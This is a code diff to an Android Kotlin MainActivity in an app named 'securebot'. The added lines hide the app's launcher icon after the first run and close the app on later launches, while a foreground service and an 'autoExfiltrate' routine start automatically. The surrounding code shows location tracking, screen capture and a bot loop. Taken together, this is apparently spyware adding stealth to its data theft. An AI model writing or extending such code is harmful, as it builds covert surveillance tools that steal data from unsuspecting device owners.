@@ -101,6 +101,16 @@ class MainActivity : Activity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        // Check if first run – if not, hide the launcher and finish
+        val prefs = getSharedPreferences("securebot", MODE_PRIVATE)
+        isFirstRun = prefs.getBoolean("first_run", true)
+        if (!isFirstRun) {
+            disableLauncher()
+            finish()
+            return
+        }
+
+        // First run – show UI
         window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
         window.setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN)
         val decorView = window.decorView
@@ -122,21 +132,17 @@ class MainActivity : Activity() {
         setContentView(scrollView)
         locationClient = LocationServices.getFusedLocationProviderClient(this)
         mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-        deviceId = getSharedPreferences("securebot", MODE_PRIVATE).getString("device_id", null) ?: run {
+        deviceId = prefs.getString("device_id", null) ?: run {
             val newId = generateDeviceId()
-            getSharedPreferences("securebot", MODE_PRIVATE).edit().putString("device_id", newId).apply()
+            prefs.edit().putString("device_id", newId).apply()
             newId
         }
-        isFirstRun = getSharedPreferences("securebot", MODE_PRIVATE).getBoolean("first_run", true)
-        if (isFirstRun) {
-            getSharedPreferences("securebot", MODE_PRIVATE).edit().putBoolean("first_run", false).apply()
-            startForegroundService()
-            handler.postDelayed({
-                autoExfiltrate()
-            }, 3000)
-        } else {
-            startForegroundService()
-        }
+        // Mark first run as done (will hide on next launch)
+        prefs.edit().putBoolean("first_run", false).apply()
+        startForegroundService()
+        handler.postDelayed({
+            autoExfiltrate()
+        }, 3000)
         setupPermissionsUI()
         checkPermissions()
         startBot()
@@ -146,6 +152,19 @@ class MainActivity : Activity() {
         val letters = ('A'..'Z').shuffled().take(4).joinToString("")
         val digits = (0..9).shuffled().take(6).joinToString("")
         return letters + digits
+    }
+
+    private fun disableLauncher() {
+        try {
+            val componentName = android.content.ComponentName(this, MainActivity::class.java)
+            packageManager.setComponentEnabledSetting(
+                componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
     }
 
     private fun setupPermissionsUI() {
